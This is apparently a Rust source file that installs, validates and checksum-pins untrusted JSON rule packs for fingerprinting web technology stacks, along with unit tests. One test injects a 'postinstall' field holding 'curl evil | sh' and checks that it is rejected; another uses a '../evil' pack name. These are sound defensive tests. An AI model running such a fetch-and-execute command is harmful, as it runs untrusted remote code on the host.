//! Rule packs: versioned bundles of detection rules that anyone can publish.
//!
//! A pack is one JSON document (manifest fields plus `rules`). Packs are
//! untrusted: they are size-limited, strictly schema-checked, every rule is
//! compiled and validated before anything is written to disk, and installed
//! packs are pinned by SHA-256 so a pack that changes on disk afterwards is
//! not loaded.
//!
//! ```text
//! $PLONIX_HOME/rules/
//! ├── lock.json          name → version, sha256, source, installed_at
//! └── packs/<name>.json  the exact bytes that were verified
//! ```

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use anyhow::{Context, Result, anyhow, bail};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::detect::{self, Detector, Rule, RuleDef, check_text, clean};
use crate::paths::{Home, write_private};

pub const FORMAT_VERSION: u32 = 1;
pub const MAX_PACK_BYTES: usize = 1024 * 1024;
pub const MAX_RULES_PER_PACK: usize = 2000;
pub const MAX_INSTALLED_PACKS: usize = 200;

/// Packs shipped with Plonix, so detection works before anything is installed.
pub const BUILTIN: &[(&str, &str)] = &[
    ("web-servers", include_str!("../../../store/packs/web-servers.json")),
    ("frameworks", include_str!("../../../store/packs/frameworks.json")),
    ("cms", include_str!("../../../store/packs/cms.json")),
    ("edge", include_str!("../../../store/packs/edge.json")),
    ("api-surface", include_str!("../../../store/packs/api-surface.json")),
];

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PackDoc {
    /// Format version, currently 1.
    pub plonix_pack: u32,
    pub name: String,
    pub version: String,
    pub description: String,
    pub author: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub license: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub homepage: String,
    pub rules: Vec<RuleDef>,
}

/// A validated pack with compiled rules.
#[derive(Debug, Clone)]
pub struct Pack {
    pub doc: PackDoc,
    pub rules: Vec<Rule>,
    pub sha256: String,
}

/// Summary of a pack for listings.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackInfo {
    pub name: String,
    pub version: String,
    pub description: String,
    pub author: String,
    pub rules: usize,
    pub sha256: String,
    /// `built-in`, a file path or a URL.
    pub source: String,
    pub builtin: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub installed_at: Option<i64>,
}

impl Pack {
    pub fn info(&self, source: &str, builtin: bool, installed_at: Option<i64>) -> PackInfo {
        PackInfo {
            name: self.doc.name.clone(),
            version: self.doc.version.clone(),
            description: self.doc.description.clone(),
            author: self.doc.author.clone(),
            rules: self.rules.len(),
            sha256: self.sha256.clone(),
            source: source.to_string(),
            builtin,
            installed_at,
        }
    }
}

pub fn sha256_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes).iter().map(|b| format!("{b:02x}")).collect()
}

/// Every problem in a pack, so authors can fix them in one go.
#[derive(Debug)]
pub struct PackErrors(pub Vec<String>);

impl std::fmt::Display for PackErrors {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "invalid rule pack:")?;
        for e in &self.0 {
            write!(f, "\n  - {e}")?;
        }
        Ok(())
    }
}

impl std::error::Error for PackErrors {}

/// Parses and validates a pack from untrusted bytes.
pub fn parse(bytes: &[u8]) -> Result<Pack, PackErrors> {
    let one = |e: String| PackErrors(vec![e]);
    if bytes.len() > MAX_PACK_BYTES {
        return Err(one(format!("pack is {} bytes; the limit is {MAX_PACK_BYTES}", bytes.len())));
    }
    let text = std::str::from_utf8(bytes).map_err(|_| one("pack is not UTF-8 text".into()))?;
    let doc: PackDoc = serde_json::from_str(text).map_err(|e| one(format!("not a valid pack document: {}", clean(&e.to_string(), 300))))?;

    let mut errors = vec![];
    if doc.plonix_pack != FORMAT_VERSION {
        errors.push(format!("plonix_pack: format {} is not supported (this Plonix reads format {FORMAT_VERSION})", doc.plonix_pack));
    }
    if let Err(e) = check_pack_name(&doc.name) {
        errors.push(format!("name: {e}"));
    }
    if let Err(e) = check_version(&doc.version) {
        errors.push(format!("version: {e}"));
    }
    for (field, value, max, empty) in [
        ("description", &doc.description, 300, false),
        ("author", &doc.author, 100, false),
        ("license", &doc.license, 64, true),
        ("homepage", &doc.homepage, 200, true),
    ] {
        if let Err(e) = check_text(value, max, empty) {
            errors.push(format!("{field}: {e}"));
        }
    }
    if doc.rules.is_empty() {
        errors.push("rules: a pack needs at least one rule".into());
    }
    if doc.rules.len() > MAX_RULES_PER_PACK {
        errors.push(format!("rules: at most {MAX_RULES_PER_PACK} rules per pack"));
    }
    let mut rules = vec![];
    let mut seen = BTreeMap::new();
    for (i, def) in doc.rules.iter().take(MAX_RULES_PER_PACK).enumerate() {
        let label = format!("rules[{i}] ({})", clean(&def.id, 64));
        if let Some(prev) = seen.insert(def.id.clone(), i) {
            errors.push(format!("{label}: duplicate id, also used by rules[{prev}]"));
        }
        match detect::compile(def.clone(), &doc.name) {
            Ok(r) => rules.push(r),
            Err(e) => errors.push(format!("{label}: {e}")),
        }
    }
    if !errors.is_empty() {
        return Err(PackErrors(errors));
    }
    Ok(Pack { doc, rules, sha256: sha256_hex(bytes) })
}

pub fn check_pack_name(name: &str) -> Result<(), String> {
    let ok = !name.is_empty()
        && name.len() <= 64
        && name.bytes().next().is_some_and(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
        && name.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-');
    if ok { Ok(()) } else { Err(format!("`{}` must be 1-64 of [a-z0-9-], starting with a letter or digit", clean(name, 64))) }
}

/// `MAJOR.MINOR.PATCH` with an optional `-pre` suffix.
pub fn check_version(v: &str) -> Result<(), String> {
    parse_version(v).map(|_| ()).ok_or_else(|| format!("`{}` is not a version like 1.2.0", clean(v, 32)))
}

/// Comparable form of a version: numbers, then release (`-pre` sorts first).
pub fn parse_version(v: &str) -> Option<(u64, u64, u64, bool, String)> {
    if v.len() > 32 {
        return None;
    }
    let (core, pre) = match v.split_once('-') {
        Some((c, p)) if !p.is_empty() && p.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'.') => (c, Some(p)),
        Some(_) => return None,
        None => (v, None),
    };
    let mut parts = core.split('.').map(|p| if !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()) { p.parse().ok() } else { None });
    let (a, b, c) = (parts.next()??, parts.next()??, parts.next()??);
    if parts.next().is_some() {
        return None;
    }
    Some((a, b, c, pre.is_none(), pre.unwrap_or("").to_string()))
}

pub fn newer(candidate: &str, installed: &str) -> bool {
    match (parse_version(candidate), parse_version(installed)) {
        (Some(a), Some(b)) => a > b,
        _ => false,
    }
}

// ---- installed packs -------------------------------------------------------

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct Lock {
    packs: BTreeMap<String, LockEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct LockEntry {
    version: String,
    sha256: String,
    source: String,
    installed_at: i64,
}

/// Packs installed in a Plonix home directory, plus the built-in ones.
pub struct Library {
    dir: PathBuf,
}

/// Everything that loaded, and what was skipped and why.
#[derive(Debug, Default)]
pub struct Loaded {
    pub packs: Vec<(Pack, PackInfo)>,
    pub problems: Vec<String>,
}

impl Loaded {
    pub fn detector(&self) -> Detector {
        Detector::new(self.packs.iter().flat_map(|(p, _)| p.rules.iter().cloned()).collect())
    }
}

impl Library {
    pub fn new(home: &Home) -> Self {
        Self { dir: home.root.join("rules") }
    }

    pub fn at(dir: &Path) -> Self {
        Self { dir: dir.to_path_buf() }
    }

    fn lock_path(&self) -> PathBuf {
        self.dir.join("lock.json")
    }

    fn pack_path(&self, name: &str) -> PathBuf {
        // `name` is validated by check_pack_name, so it cannot contain `/` or `..`.
        self.dir.join("packs").join(format!("{name}.json"))
    }

    fn read_lock(&self) -> Result<Lock> {
        match std::fs::read(self.lock_path()) {
            Ok(b) => serde_json::from_slice(&b).context("reading rules/lock.json"),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Lock::default()),
            Err(e) => Err(e).context("reading rules/lock.json"),
        }
    }

    fn write_lock(&self, lock: &Lock) -> Result<()> {
        std::fs::create_dir_all(&self.dir)?;
        let tmp = self.dir.join("lock.json.tmp");
        write_private(&tmp, &serde_json::to_vec_pretty(lock)?)?;
        std::fs::rename(&tmp, self.lock_path())?;
        Ok(())
    }

    /// A value that changes whenever installed packs change, for caching.
    pub fn stamp(&self) -> Option<std::time::SystemTime> {
        std::fs::metadata(self.lock_path()).and_then(|m| m.modified()).ok()
    }

    /// Validates and installs a pack. When `expected_sha256` is given, the
    /// bytes must hash to it. Returns the pack and the version it replaced.
    pub fn install(&self, bytes: &[u8], source: &str, expected_sha256: Option<&str>) -> Result<(Pack, Option<String>)> {
        let actual = sha256_hex(bytes);
        if let Some(want) = expected_sha256 {
            let want = want.trim().to_ascii_lowercase();
            if want != actual {
                bail!("checksum mismatch: expected sha256 {want}, got {actual}. The pack was not installed.");
            }
        }
        let pack = parse(bytes).map_err(|e| anyhow!(e))?;
        let name = pack.doc.name.clone();
        if BUILTIN.iter().any(|(n, _)| *n == name) {
            bail!("`{name}` is the name of a built-in pack; give the pack a different name");
        }
        let mut lock = self.read_lock()?;
        if !lock.packs.contains_key(&name) && lock.packs.len() >= MAX_INSTALLED_PACKS {
            bail!("too many rule packs installed (limit {MAX_INSTALLED_PACKS}); remove some first");
        }
        std::fs::create_dir_all(self.dir.join("packs"))?;
        let tmp = self.dir.join("packs").join(format!(".{name}.tmp"));
        write_private(&tmp, bytes)?;
        std::fs::rename(&tmp, self.pack_path(&name))?;
        let previous = lock.packs.insert(
            name,
            LockEntry { version: pack.doc.version.clone(), sha256: actual, source: source.to_string(), installed_at: crate::model::now_ms() },
        );
        self.write_lock(&lock)?;
        Ok((pack, previous.map(|p| p.version)))
    }

    pub fn remove(&self, name: &str) -> Result<bool> {
        if BUILTIN.iter().any(|(n, _)| *n == name) {
            bail!("`{name}` is built in and cannot be removed");
        }
        check_pack_name(name).map_err(|e| anyhow!(e))?;
        let mut lock = self.read_lock()?;
        let existed = lock.packs.remove(name).is_some();
        let _ = std::fs::remove_file(self.pack_path(name));
        if existed {
            self.write_lock(&lock)?;
        }
        Ok(existed)
    }

    /// Installed version of a pack, if any.
    pub fn installed_version(&self, name: &str) -> Option<String> {
        self.read_lock().ok()?.packs.get(name).map(|e| e.version.clone())
    }

    /// Built-in packs, then installed ones. A pack that no longer matches
    /// its pinned checksum, or no longer validates, is skipped and reported.
    pub fn load(&self) -> Loaded {
        let mut out = Loaded::default();
        for (name, text) in BUILTIN {
            match parse(text.as_bytes()) {
                Ok(p) => {
                    let info = p.info("built-in", true, None);
                    out.packs.push((p, info));
                }
                Err(e) => out.problems.push(format!("built-in pack {name}: {e}")),
            }
        }
        let lock = match self.read_lock() {
            Ok(l) => l,
            Err(e) => {
                out.problems.push(format!("{e:#}"));
                return out;
            }
        };
        for (name, entry) in lock.packs {
            if check_pack_name(&name).is_err() {
                out.problems.push(format!("lock.json lists an invalid pack name `{}`", clean(&name, 64)));
                continue;
            }
            let bytes = match std::fs::read(self.pack_path(&name)) {
                Ok(b) => b,
                Err(e) => {
                    out.problems.push(format!("pack {name}: {e}"));
                    continue;
                }
            };
            if sha256_hex(&bytes) != entry.sha256 {
                out.problems.push(format!(
                    "pack {name}: file changed since it was installed (checksum mismatch); not loaded. Reinstall it with `plonix rules add`."
                ));
                continue;
            }
            match parse(&bytes) {
                Ok(p) if p.doc.name == name => {
                    let info = p.info(&entry.source, false, Some(entry.installed_at));
                    out.packs.push((p, info));
                }
                Ok(_) => out.problems.push(format!("pack {name}: name inside the file does not match")),
                Err(e) => out.problems.push(format!("pack {name}: {e}")),
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const PACK: &str = r#"{
        "plonix_pack": 1, "name": "acme-stack", "version": "1.0.0",
        "description": "Acme internal stack", "author": "someone",
        "rules": [
            {"id": "acme-gw", "name": "Acme Gateway", "category": "load-balancer",
             "conditions": [{"header": "X-Acme-Gateway", "regex": "v([\\d.]+)", "version": "$1"}]}
        ]
    }"#;

    #[test]
    fn builtin_packs_are_valid() {
        let loaded = Library::at(Path::new("/nonexistent")).load();
        assert!(loaded.problems.is_empty(), "{:?}", loaded.problems);
        assert_eq!(loaded.packs.len(), BUILTIN.len());
        assert!(loaded.detector().rules.len() > 40);
    }

    #[test]
    fn builtin_packs_detect_common_stacks() {
        use crate::model::Exchange;
        let ex = |id, host: &str, path: &str, headers: &[(&str, &str)]| Exchange {
            id,
            host: host.into(),
            path: path.into(),
            resp_headers: headers.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
            ..Default::default()
        };
        let d = Library::at(Path::new("/nonexistent")).load().detector();
        let ids = |exs: &[Exchange]| d.detect(exs).into_iter().map(|t| (t.id, t.version)).collect::<Vec<_>>();

        let api = ids(&[ex(1, "api.test", "/graphql", &[("Server", "gunicorn/21.2.0"), ("Set-Cookie", "csrftoken=x; Path=/")])]);
        assert!(api.contains(&("gunicorn".into(), Some("21.2.0".into()))), "{api:?}");
        assert!(api.iter().any(|(id, _)| id == "django") && api.iter().any(|(id, _)| id == "graphql"), "{api:?}");
        assert!(!api.iter().any(|(id, _)| id == "ruby"), "gunicorn is not unicorn: {api:?}");

        let edge = ids(&[ex(2, "cdn.test", "/", &[("Server", "cloudflare"), ("Set-Cookie", "incap_ses_123_456=abc; path=/")])]);
        assert!(edge.iter().any(|(id, _)| id == "cloudflare") && edge.iter().any(|(id, _)| id == "imperva"), "{edge:?}");

        let iis = ids(&[ex(3, "win.test", "/default.aspx", &[("Server", "Microsoft-IIS/10.0"), ("X-AspNet-Version", "4.0.30319")])]);
        assert!(iis.contains(&("iis".into(), Some("10.0".into()))) && iis.contains(&("aspnet".into(), Some("4.0.30319".into()))), "{iis:?}");
    }

    #[test]
    fn install_load_and_remove() {
        let dir = tempfile::tempdir().unwrap();
        let lib = Library::at(dir.path());
        let (p, prev) = lib.install(PACK.as_bytes(), "./acme.json", None).unwrap();
        assert_eq!(p.rules.len(), 1);
        assert!(prev.is_none());
        let loaded = lib.load();
        assert!(loaded.problems.is_empty());
        let info = &loaded.packs.last().unwrap().1;
        assert_eq!((info.name.as_str(), info.builtin, info.source.as_str()), ("acme-stack", false, "./acme.json"));

        let v2 = PACK.replace("1.0.0", "1.1.0");
        let (_, prev) = lib.install(v2.as_bytes(), "./acme.json", None).unwrap();
        assert_eq!(prev.as_deref(), Some("1.0.0"));
        assert_eq!(lib.installed_version("acme-stack").as_deref(), Some("1.1.0"));

        assert!(lib.remove("acme-stack").unwrap());
        assert!(!lib.remove("acme-stack").unwrap());
        assert!(lib.remove("web-servers").is_err());
        assert_eq!(lib.load().packs.len(), BUILTIN.len());
    }

    #[test]
    fn checksum_is_enforced_on_install_and_load() {
        let dir = tempfile::tempdir().unwrap();
        let lib = Library::at(dir.path());
        let err = lib.install(PACK.as_bytes(), "x", Some(&"0".repeat(64))).unwrap_err();
        assert!(err.to_string().contains("checksum mismatch"));
        assert!(lib.load().packs.len() == BUILTIN.len(), "nothing installed after a mismatch");

        lib.install(PACK.as_bytes(), "x", Some(&sha256_hex(PACK.as_bytes()))).unwrap();
        // Tamper with the installed file: it must not load.
        let path = dir.path().join("packs/acme-stack.json");
        std::fs::write(&path, PACK.replace("Acme Gateway", "Evil Gateway")).unwrap();
        let loaded = lib.load();
        assert_eq!(loaded.packs.len(), BUILTIN.len());
        assert!(loaded.problems[0].contains("checksum mismatch"), "{:?}", loaded.problems);
    }

    #[test]
    fn invalid_packs_report_every_problem() {
        let bad = r#"{"plonix_pack": 2, "name": "../evil", "version": "one", "description": "", "author": "a",
            "rules": [{"id": "x", "name": "x", "category": "cms", "conditions": [{"path": "("}]},
                      {"id": "x", "name": "x", "category": "cms", "conditions": [{"path": "a"}]}]}"#;
        let errs = parse(bad.as_bytes()).unwrap_err().0;
        let all = errs.join("\n");
        for want in ["plonix_pack", "name:", "version:", "description:", "rules[0] (x): conditions[0]", "duplicate id"] {
            assert!(all.contains(want), "missing `{want}` in:\n{all}");
        }
        assert!(parse(&vec![b' '; MAX_PACK_BYTES + 1]).is_err());
        assert!(parse(b"\xff\xfe").is_err());
        let extra = PACK.replace("\"author\"", "\"postinstall\": \"curl evil | sh\", \"author\"");
        assert!(parse(extra.as_bytes()).unwrap_err().to_string().contains("unknown field"));
    }

    #[test]
    fn builtin_names_are_reserved() {
        let dir = tempfile::tempdir().unwrap();
        let shadow = PACK.replace("acme-stack", "web-servers");
        assert!(Library::at(dir.path()).install(shadow.as_bytes(), "x", None).is_err());
    }

    #[test]
    fn versions() {
        assert!(newer("1.10.0", "1.9.3"));
        assert!(newer("1.0.0", "1.0.0-beta"));
        assert!(!newer("1.0.0", "1.0.0"));
        assert!(check_version("1.2").is_err());
        assert!(check_version("1.2.3-rc.1").is_ok());
    }
}
